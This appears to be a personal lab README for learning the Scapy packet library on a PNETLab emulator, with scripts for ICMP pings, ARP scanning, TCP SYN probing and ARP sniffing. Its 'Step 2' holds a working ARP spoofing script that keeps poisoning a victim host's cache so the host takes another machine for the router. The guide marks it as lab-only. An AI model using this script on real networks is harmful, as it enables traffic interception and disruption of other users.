# Scapy Lab

## Purpose

This section is used to explore and practice the Scapy packet manipulation framework.

Scapy is a powerful Python-based networking tool used for:

- Packet crafting
- Packet injection
- Packet sniffing
- Protocol testing
- Traffic generation
- Security testing
- Custom protocol experimentation
- Network troubleshooting

Unlike pyATS (device-level automation), Scapy works at the **packet level**, giving deep visibility into how networks actually behave.

---

## What Scapy Helps Us Do

- Build raw Ethernet/IP/TCP/UDP/ICMP packets
- Inject custom packets into real networks
- Capture and analyze responses
- Simulate traffic flows
- Validate protocol behavior
- Learn networking at packet level

---

# Lab Architecture

## Automation VM (Ubuntu 24.04)

| Item | Value |
|------|------|
| Host | madhu-labs |
| IP | 192.168.0.34 |
| Role | Automation + Testing VM |

This VM hosts:
- Python virtual environments
- Scapy
- pyATS
- pytest
- automation scripts
- traffic frameworks

---

## PNETLab VM (Network Emulator)

| Item | Value |
|------|------|
| Platform | PNETLab 5.3.13 |
| Purpose | Network emulation |

### Devices

| Device | IP | OS |
|--------|----|----|
| CSR | 192.168.0.101 | IOS-XE |
| R2 | 192.168.0.102 | IOS |

---

# Scapy Directory Structure

```
~/Automation-Labs/scapy
```

```
scapy/
├── README.md
├── arp/
├── bgp/
├── icmp/
├── tcp/
└── vxlan/
```

---

# Virtual Environment

We reuse the same environment created for pyATS.

```
~/Automation-Labs/env/pyats
```

### Activate

```bash
source ~/Automation-Labs/env/pyats/bin/activate
```

Expected prompt:

```
(pyats) ubuntu@madhu-labs:~$
```

---

# Install Scapy

## Step 1: Activate venv

```bash
source ~/Automation-Labs/env/pyats/bin/activate
```

## Step 2: Install Scapy

```bash
pip install scapy
```

## Step 3: Verify

```bash
python3 -c "from scapy.all import *; print('Scapy Installed OK')"
```

---

# First Scapy Test — ICMP Ping

## Goal

Send ICMP packets from Automation VM → PNETLab routers.

### Targets

- CSR → 192.168.0.101  
- R2 → 192.168.0.102  

---

## Script Location

```
~/Automation-Labs/scapy/icmp/ping_test.py
```

---

## Script

```python
from scapy.all import IP, ICMP, sr1

targets = ["192.168.0.101", "192.168.0.102"]

for ip in targets:
    print(f"\nSending ICMP packet to {ip}")

    packet = IP(dst=ip)/ICMP()

    reply = sr1(packet, timeout=2, verbose=0)

    if reply:
        print(f"Reply received from {ip}")
        print(reply.summary())
    else:
        print(f"No reply from {ip}")
```

---

## Run Script

```bash
source ~/Automation-Labs/env/pyats/bin/activate
cd ~/Automation-Labs/scapy/icmp
python3 ping_test.py
```

---

# Expected Output

```
Sending ICMP packet to 192.168.0.101
Reply received from 192.168.0.101

Sending ICMP packet to 192.168.0.102
Reply received from 192.168.0.102
```

---

# IMPORTANT NOTES

## Run with proper permissions

Scapy needs raw socket access:

```bash
sudo -E python3 ping_test.py
```

OR:

```bash
sudo -E $(which python3) ping_test.py
```

---

## Common Issue

### ModuleNotFoundError with sudo

Fix:
```
sudo -E ensures venv environment is preserved
```

---

# Next Scapy Labs (We will build step-by-step)

## ICMP Enhancements

### TTL Experiment

```python
from scapy.all import IP, ICMP, sr1

packet = IP(dst="192.168.0.101", ttl=1)/ICMP()
sr1(packet, timeout=2, verbose=0)
```

---

### Payload Test

```python
from scapy.all import IP, ICMP, sr1

packet = IP(dst="192.168.0.101")/ICMP()/"HELLO_SCAPY"
sr1(packet, timeout=2, verbose=0)
```

---

## ARP Lab (Very Important)

```python
from scapy.all import ARP, Ether, srp

packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.0.0/24")
srp(packet, timeout=2, verbose=0)
```

---

## TCP SYN Test

```python
from scapy.all import IP, TCP, sr1

packet = IP(dst="192.168.0.101")/TCP(dport=22, flags="S")
sr1(packet, timeout=2, verbose=0)
```

---

# Recommended Learning Path (Based on Your Lab)

1. ICMP (DONE)
2. ICMP advanced (TTL, payload)
3. ARP (next important step)
4. TCP SYN probing
5. UDP probing
6. Traffic simulation

---

# Scapy + pyATS Hybrid Framework (IMPORTANT IDEA)

## Concept

| Tool | Role |
|------|------|
| pyATS | Device validation (CLI/API) |
| Scapy | Packet-level validation |

## Example Use Case

1. pyATS verifies interface is up
2. Scapy sends packet to validate real traffic flow
3. Compare control-plane vs data-plane behavior

---

# Next Steps Options

## Option A (Best Next Step)

ARP Lab + Live Packet Sniffing  
→ Learn MAC learning + ARP resolution

## Option B

TCP SYN Scanner  
→ Learn port behavior and firewall response

## Option C

pyATS + Scapy Hybrid Automation  
→ Enterprise-level validation framework

---

# Summary

We successfully:

- Built Scapy lab environment
- Installed Scapy in Automation VM
- Connected to PNETLab devices
- Sent ICMP packets successfully
- Structured lab for ARP, TCP, VXLAN
- Designed future automation roadmap

This setup is now ready for:
- Packet-level networking
- Traffic generation
- Security testing
- Hybrid automation frameworks


# Step 1: ARP Scan Script

**Location:** `~/Automation-Labs/scapy/arp/arp_scan.py`

```python
from scapy.all import ARP, Ether, srp

# Define the subnet to scan
target_subnet = "192.168.0.0/24"

# Broadcast ARP requests
arp_request = ARP(pdst=target_subnet)
broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
arp_packet = broadcast / arp_request

print(f"Scanning subnet {target_subnet}...")

answered_list = srp(arp_packet, timeout=2, verbose=1)[0]

for sent, received in answered_list:
    print(f"IP: {received.psrc}, MAC: {received.hwsrc}")
```

**What it does:**

- Broadcasts ARP requests to all hosts in `192.168.0.0/24`
- Collects responses
- Prints IP ↔ MAC mapping of devices

---

# Step 2: ARP Spoofing Test (Optional / Lab Exercise)

**Location:** `~/Automation-Labs/scapy/arp/arp_spoof.py`

```python
from scapy.all import ARP, send
import time

target_ip = "192.168.0.102"  # victim device
spoof_ip = "192.168.0.101"   # pretend to be CSR

arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op=2)

print(f"Sending spoofed ARP packets to {target_ip} claiming {spoof_ip}...")

while True:
    send(arp_response, verbose=0)
    time.sleep(2)
```

**WARNING:** Only use in lab environment. Never on production network.

---

# Step 3: Packet Sniffing ARP

**Location:** `~/Automation-Labs/scapy/sniff/sniff_arp.py`

```python
from scapy.all import sniff, ARP

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2):
        if pkt[ARP].op == 1:
            print(f"ARP Request: {pkt[ARP].psrc} is asking for {pkt[ARP].pdst}")
        elif pkt[ARP].op == 2:
            print(f"ARP Reply: {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")

print("Sniffing ARP packets on network...")
sniff(filter="arp", prn=arp_monitor_callback, store=0)
```

**What it does:**

- Captures live ARP packets
- Differentiates between ARP Requests and Replies
- Prints IP ↔ MAC info

---

# Step 4: Run Scripts

## ARP Scan

```bash
source ~/Automation-Labs/env/pyats/bin/activate
cd ~/Automation-Labs/scapy/arp
sudo python3 arp_scan.py
```

## ARP Spoofing (Lab Only)

```bash
sudo python3 arp_spoof.py
```

## Packet Sniffing ARP

```bash
cd ~/Automation-Labs/scapy/sniff
sudo python3 sniff_arp.py
```

---